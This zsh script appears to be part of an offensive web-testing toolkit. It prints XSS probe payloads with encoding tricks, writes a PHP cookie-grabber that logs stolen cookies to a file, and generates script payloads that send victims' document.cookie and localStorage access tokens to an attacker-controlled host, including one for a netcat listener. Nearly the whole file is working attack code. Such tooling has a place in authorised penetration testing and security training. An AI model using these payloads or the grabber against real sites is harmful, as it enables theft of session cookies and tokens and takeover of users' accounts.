#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-xss
#############################################################

qq-enum-xss-tests() {
echo $(cat << 'END' 

## Usage
- URL (path?query#fragment)
- any input fields

## Payloads

"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)

## Alterations
" for ' and vice versa according to where injection lands
alert(1) for (confirm)(1) or confirm`1`
// for <!--
spaces for / or %0A, %0C or %0D.

END
)
}

qq-enum-web-xss-exfil-grabber-generate() {
cat <<'EOF' | tee grabber.php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>
EOF
}

qq-enum-web-xss-exfil-grabber-payloads(){
    qq-vars-set-lhost
cat << END 
<script>document.location='http://${__LHOST}/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://${__LHOST}/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
END
}

qq-enum-web-xss-exfil-cookie-netcat() {
    qq-vars-set-lhost
    __warn "Start a netcat listener on port 80"
    echo "<script> new Image().src=\"http://${__LHOST}/page?var=\"+document.cookie; </script>" 
}

